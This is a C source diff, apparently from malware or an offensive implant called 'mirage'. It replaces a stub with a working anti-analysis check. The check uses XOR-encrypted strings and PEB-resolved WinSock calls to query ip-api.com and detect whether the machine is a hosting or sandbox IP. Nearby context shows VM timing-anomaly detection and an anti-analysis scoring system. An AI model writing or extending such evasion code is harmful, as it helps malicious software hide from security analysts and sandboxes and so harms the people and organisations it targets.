@@ -12,6 +12,8 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "config.h"
+#include "ws2.h"
+#include "enc_strings.h"
 #include <string.h>
 
 /* ── XOR-encrypted strings ──────────────────────────────── */
@@ -241,14 +243,82 @@ int mirage_check_timing_anomaly(void) {
     return (t1 - t0) < VM_TIMING_ANOMALY_TSC ? 1 : 0;
 }
 
+/* ── XOR-encrypted strings for hosting IP check ──────────── */
+
+/* ip-api.com */
+static const uint8_t enc_ip_api_com[] = { 0xb4,0x75,0x09,0x86,0xe8,0x2f,0x52,0x5b,0xf7,0xbe };
+#define ENC_IP_API_COM_LEN 10
+
+/* GET /json/ HTTP/1.1\r\nHost: ip-api.com\r\nConnection: close\r\n\r\n */
+static const uint8_t enc_http_get_ipapi[] = {
+    0x9a,0x40,0x70,0xc7,0xb7,0x2c,0x0f,0x57,0xf6,0xfc,0x56,0xc5,
+    0xe0,0x0a,0x7b,0xfd,0xec,0x2b,0x15,0xea,0x92,0x0e,0x13,0x4b,
+    0xec,0xe9,0x56,0xe4,0xc4,0x73,0x4a,0xa2,0xb4,0x2b,0x47,0x88,
+    0xf5,0x4b,0x76,0x7b,0xf7,0xbd,0x18,0xe8,0xd7,0x2a,0x42,0xbd,
+    0xb3,0x3f,0x04,0x84,0xf4,0x29,0x0f,0x5d,0x95,0xd9,0x7b,0x87
+};
+#define ENC_HTTP_GET_IPAPI_LEN 60
+
+/* "hosting":true */
+static const uint8_t enc_hosting_true[] = { 0xff,0x6d,0x4b,0x94,0xec,0x2f,0x12,0x5f,0xba,0xe9,0x02,0xff,0xc1,0x3b };
+#define ENC_HOSTING_TRUE_LEN 14
+
 /* ── checkHostingIP ──────────────────────────────────────── */
 
 int mirage_check_hosting_ip(void) {
-    /* This requires WinSock initialization and TCP connection to ip-api.com.
-     * In the Zig version this uses the hash-resolved ws2.Socket.
-     * For the C translation, this is a stub that returns -1 (indeterminate).
-     * Full implementation requires ws2 initialization which is not yet
-     * ported to C. The anti_analysis scoring adds a partial score for
-     * indeterminate results. */
-    return -1;
+    /* Resolve hostname from encrypted string */
+    char host[16];
+    enc_decrypt(enc_ip_api_com, ENC_IP_API_COM_LEN, host);
+
+    /* Connect to ip-api.com:80 via PEB-resolved ws2 */
+    ws2_socket_t sk;
+    ws2_result_t r = ws2_connect(&sk, host, 80);
+    if (r != WS2_OK) return -1;
+
+    /* Build and send HTTP GET request from encrypted template */
+    char req[128];
+    enc_decrypt(enc_http_get_ipapi, ENC_HTTP_GET_IPAPI_LEN, req);
+
+    size_t sent;
+    r = ws2_send(sk.handle, (const uint8_t *)req, ENC_HTTP_GET_IPAPI_LEN, &sent);
+    if (r != WS2_OK) { ws2_close(sk.handle); return -1; }
+
+    /* Read response */
+    char resp[2048];
+    size_t total = 0;
+    while (total < sizeof(resp) - 1) {
+        size_t chunk;
+        r = ws2_recv(sk.handle, (uint8_t *)resp + total,
+                      sizeof(resp) - 1 - total, &chunk);
+        if (r != WS2_OK || chunk == 0) break;
+        total += chunk;
+    }
+    resp[total] = '\0';
+    ws2_close(sk.handle);
+
+    if (total == 0) return -1;
+
+    /* Search for "hosting":true in response body */
+    char needle[32];
+    enc_decrypt(enc_hosting_true, ENC_HOSTING_TRUE_LEN, needle);
+
+    /* Search past HTTP headers (after \r\n\r\n) */
+    const char *body = resp;
+    const char *p = resp;
+    while ((size_t)(p - resp) < total - 3) {
+        if (p[0] == '\r' && p[1] == '\n' && p[2] == '\r' && p[3] == '\n') {
+            body = p + 4;
+            break;
+        }
+        p++;
+    }
+
+    /* Linear scan for "hosting":true in JSON body */
+    size_t body_len = total - (size_t)(body - resp);
+    for (size_t i = 0; i + ENC_HOSTING_TRUE_LEN <= body_len; i++) {
+        if (memcmp(body + i, needle, ENC_HOSTING_TRUE_LEN) == 0)
+            return 1; /* hosting detected */
+    }
+
+    return 0; /* not hosting */
 }
